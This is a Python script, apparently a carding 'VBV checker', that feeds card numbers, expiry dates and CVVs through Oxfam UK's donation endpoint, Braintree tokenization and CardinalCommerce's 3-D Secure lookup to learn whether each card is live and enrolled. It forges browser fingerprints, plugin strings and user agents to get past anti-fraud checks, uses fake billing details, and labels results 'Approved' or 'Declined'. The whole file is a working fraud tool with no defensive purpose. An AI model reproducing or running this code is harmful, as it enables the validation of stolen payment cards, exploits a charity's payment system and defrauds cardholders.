import requests
import base64, random, string
import random
import uuid


def capture(string, start, end):
 start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
 return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def plug_rnd():
    random_chars = "".join(random.choices(string.ascii_letters + string.digits, k=10))
    random_suffix = "".join(random.choices(string.ascii_letters + string.digits, k=28))
    random_yux = "".join(random.choices(string.ascii_letters + string.digits, k=3))
    return f"{random_chars}::{random_suffix}::{random_yux}"


def chkvbv(card):
    expl = card.strip().split('|')                
    cc = expl[0]
    mes = expl[1]
    ano = expl[2]
    cvv = expl[3]             

    session = requests.session()

    url = "www.oxfam.org.uk"
    generar_uuid = str(uuid.uuid4())
    sessionId = generar_uuid
    sessionId2 = generar_uuid
    Fingerprint = "".join(random.choice("0123456789abcdef") for _ in range(32))
    plug = plug_rnd()
    plug2 = plug_rnd()


    data1 = "amount=25.00&frequency=single&campaign=222"

    head1 = {
        'authority': 'www.oxfam.org.uk','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'es-ES,es;q=0.9','referer': 'https://www.oxfam.org.uk/donate/','user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0',}
    re1 = session.get('https://www.oxfam.org.uk/_donate/', params=data1, headers=head1)

    head2 = {
        'authority': 'www.oxfam.org.uk','accept-language': 'es-ES,es;q=0.9','referer': 'https://www.oxfam.org.uk/_donate/?amount=10.00&frequency=monthly&campaign=222','user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0',}

    re2 = session.get('https://www.oxfam.org.uk/_donate/api/configuration/donations/', headers=head2)
    client_token = re2.json()["payment_methods"][0]["options"]["client_authorization"]
    braintree_bearer = base64.b64decode(client_token)
    braintree_bearer = str(braintree_bearer)
    bearer = capture(braintree_bearer, 'authorizationFingerprint":"', '"')
    me = capture(braintree_bearer,"https://api.braintreegateway.com:443/merchants/","/client_api/v1/configuration",)

    head3 = {
    "Host": "payments.braintree-api.com","content-type": "application/json","authorization": f"Bearer {bearer}","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36","braintree-version": "2018-05-10","accept": "*/*","origin": "https://www.oxfam.org.uk",}

    p = {"clientSdkMetadata": {"source": "client","integration": "custom","sessionId": sessionId,},"query": "query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }","operationName": "ClientConfiguration",}
    re3 = session.post("https://payments.braintree-api.com/graphql",headers=head3, json=p,)
    jt = capture(re3.text, '"cardinalAuthenticationJWT":"', '"')

    head4 = {'authority': 'payments.braintree-api.com','accept-language': 'es-ES,es;q=0.9','authorization': f'Bearer {bearer}','braintree-version': '2018-05-10','origin': 'https://assets.braintreegateway.com','referer': 'https://assets.braintreegateway.com/','user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0',}

    js = {'clientSdkMetadata': {'source': 'client','integration': 'custom','sessionId': sessionId, },'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }','variables': {'input': {'creditCard': {'number': cc,'expirationMonth': mes,'expirationYear': ano,'cvv': cvv,'cardholderName': 'sabasa sasas',},'options': {'validate': False,},},},'operationName': 'TokenizeCreditCard',}
    re4 = session.post('https://payments.braintree-api.com/graphql', headers=head4, json=js)
    tok = capture(re4.text, '"token":"', '"')
    bin_ = capture(re4.text, '"bin":"', '"')

    head5 = {"Host": "centinelapi.cardinalcommerce.com","content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36","accept": "*/*","origin": f"https://www.oxfam.org.uk",}

    p2 = {"BrowserPayload": {"Order": {"OrderDetails": {},"Consumer": {"BillingAddress": {},"ShippingAddress": {},"Account": {},},"Cart": [],"Token": {},"Authorization": {},"Options": {},"CCAExtension": {},},"SupportsAlternativePayments": {"cca": True,"hostedFields": False,"applepay": False,"discoverwallet": False,"wallet": False,"paypal": False,"visacheckout": False,},},"Client": {"Agent": "SongbirdJS", "Version": "1.35.0"},"ConsumerSessionId": None,"ServerJWT": f"{jt}",}
    r3 =  session.post("https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init",headers=head5,json=p2,)
    t3 = r3.text
    re_ = capture(t3, '"CardinalJWT":"', '"')
    encabezado_base64, carga_util_base64, firma = re_.split(".")
    re_1 = base64.urlsafe_b64decode(carga_util_base64 + "=" * (4 - len(carga_util_base64) % 4)).decode("utf-8")
    re = capture(re_1, '"referenceId":"', '",')
    ge = capture(re_1, '"geolocation":"', '"')
    org = capture(re_1, '"orgUnitId":"', '"')

    re5= session.get(
    f"https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=True&alias=Default&orgUnitId={org}&tmEventType=PAYMENT&referenceId={re}&geolocation={ge}&origin=Songbird",)
    no = capture(re5.text, '"nonce":"', '"')

    h5 = {"Host": "geo.cardinalcommerce.com","content-type": "application/json","accept": "*/*","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36","origin": "https://geo.cardinalcommerce.com","referer": f"https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=True&alias=Default&orgUnitId={org}&tmEventType=PAYMENT&referenceId={re}&geolocation={ge}&origin=Songbird",}
    p5 = {"Cookies": {"Legacy": True, "LocalStorage": True, "SessionStorage": True},"DeviceChannel": "Browser","Extended": {"Browser": {"Adblock": True,"AvailableJsFonts": [],"DoNotTrack": "unknown","JavaEnabled": False,},"Device": {"ColorDepth": 24,"Cpu": "unknown","Platform": "Linux armv81","TouchSupport": {"MaxTouchPoints": 5,"OnTouchStartAvailable": True,"TouchEventCreationSuccessful": True,},},},"Fingerprint": f"{Fingerprint}","FingerprintingTime": 1243,"FingerprintDetails": {"Version": "1.5.1"},"Language": "es-419","Latitude": None,"Longitude": None,"OrgUnitId": f"{org}","Origin": "Songbird","Plugins": [f"{plug}", f"{plug2}"],"ReferenceId": f"{re}","Referrer": "","Screen": {"FakedResolution": False,"Ratio": 2.2222222222222223,"Resolution": "800x360","UsableResolution": "800x360","CCAScreenSize": "01",},"CallSignEnabled": None,"ThreatMetrixEnabled": False,"ThreatMetrixEventType": "PAYMENT","ThreatMetrixAlias": "Default","TimeOffset": 300,"UserAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36","UserAgentDetails": {"FakedOS": False, "FakedBrowser": False},"BinSessionId": f"{no}",}

    r5 =  session.post("https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData",headers=h5,json=p5,)
    h6 = {"Host": "api.braintreegateway.com","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36","content-type": "application/json","accept": "*/*","origin": f"https://{url}", }

    p6 = {"amount": "25.00","additionalInfo": {"acsWindowSize": "03","billingLine1": "118 W 132nd St","billingPostalCode": "KA7 0PR","billingCountryCode": "US","billingPhoneNumber": "19006318646","billingGivenName": "doge","billingSurname": "xd","email": "DOGE@gmail.com",},"bin": f"{bin_}","dfReferenceId": f"{re}","clientMetadata": {"requestedThreeDSecureVersion": "2","sdkVersion": "web/3.80.0","cardinalDeviceDataCollectionTimeElapsed": 1354,"issuerDeviceDataCollectionTimeElapsed": 4237,"issuerDeviceDataCollectionResult": True,},"authorizationFingerprint": f"{bearer}","braintreeLibraryVersion": "braintree/web/3.80.0","_meta": {"merchantAppId": f"{url}","platform": "web","sdkVersion": "3.80.0","source": "client","integration": "custom","integrationType": "custom","sessionId": f"{sessionId2}",},}

    re7 =  session.post(f"https://api.braintreegateway.com/merchants/{me}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup",headers=h6,json=p6,)
    t6 = re7.text


    nonce = capture(t6, '"nonce":"', '"')
    ress = capture(t6, '"status":"', '"')
    sta = capture(t6, '"enrolled":"', '"')

    if 'authenticate_attempt_successful' == ress: return 'Approved! ✅', 'authenticate attempt successful'+'|'+sta
    elif 'authenticate_successful' == ress: return 'Approved! ✅','authenticate successful'+'|'+sta
    elif None == ress: return 'Declined! ❌', capture(t6, '"message":"', '"')
    else: return 'Declined! ❌',ress
